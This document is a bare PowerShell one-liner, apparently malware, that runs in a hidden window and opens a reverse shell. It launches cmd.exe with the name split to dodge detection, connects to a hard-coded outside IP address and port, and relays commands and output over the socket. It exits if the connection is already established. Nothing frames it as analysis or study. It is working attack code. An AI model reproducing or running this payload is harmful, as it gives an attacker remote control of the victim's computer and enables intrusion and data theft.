powershell -w hidden -nop -c $a="netstat -noa|findstr '149.28.146.222:19110'" ; if ($a -like '*ESTABLISHED*'){exit};$xmla='149.28.146.222';echo './';$b=19110;$c=New-Object system.net.sockets.tcpclient;echo '1';$demo=New-Object System.Byte[] $c.ReceiveBufferSize;$linen=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;echo './';$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;echo 'DONE';$p.StartInfo.FileName='cm'+'d.e'+'xe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;Sleep(0);$p.StartInfo.UseShellExecute=0;echo 'x';$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;echo './';$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($linen, 0, $linen.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);echo 'x';$c.connect($xmla,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($linen,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($linen, 0, $linen.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($demo,0,$demo.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($demo,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }}